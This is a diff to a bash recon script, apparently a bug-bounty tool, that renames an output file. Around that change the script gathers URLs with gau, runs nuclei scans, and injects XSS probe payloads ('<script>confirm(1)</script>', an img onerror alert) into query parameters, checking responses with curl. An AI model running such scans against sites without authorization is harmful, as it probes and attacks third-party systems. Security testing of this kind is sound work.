@@ -83,7 +83,7 @@ scan_url() {
     fi
 
     echo -e "\e[32m[+] Gathering URLs with gau...\e[0m"
-    cat "$folder/live.txt" | gau --subs | grep -E -iv "\.(jpg|png|svg|gif|woff|woff2|ico)" | tee -a "$folder/urls.txt"
+    cat "$folder/live.txt" | gau --subs | grep -E -iv "\.(jpg|png|svg|gif|woff|woff2|ico)" | tee -a "$folder/allurls.txt"
 
     if [[ "$mode" == "recon" ]]; then
         exit 0
@@ -93,7 +93,7 @@ scan_url() {
         echo -e "\e[32m[+] Running nuclei scans, xss and cors...\e[0m"
         nuclei -l "$folder/live.txt" -t ~/nuclei-templates -es info | tee -a "$folder/nuclei.txt"
 
-        cat "$folder/urls.txt" | tee -a "$folder/archivo.txt" | grep "=" | egrep -iv ".(jpg|peg|gif|css|tif|tiff|png|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>'| tee -a "$folder/arch.json" && cat "$folder/arch.json" | while read host do; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;031mVulnerable\n" | tee -a "$folder/xss_vulnerables.txt";done
+        cat "$folder/allurls.txt" | tee -a "$folder/archivo.txt" | grep "=" | egrep -iv ".(jpg|peg|gif|css|tif|tiff|png|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>'| tee -a "$folder/arch.json" && cat "$folder/arch.json" | while read host do; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;031mVulnerable\n" | tee -a "$folder/xss_vulnerables.txt";done
         rm  "$folder/archivo.txt"
         rm  "$folder/arch.json"
         cat "$folder/allurls.txt" | grep "=" | grep -v "^$" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | grep -i "vulnerable" | tee -a "$folder/xss_vulnerables.txt"
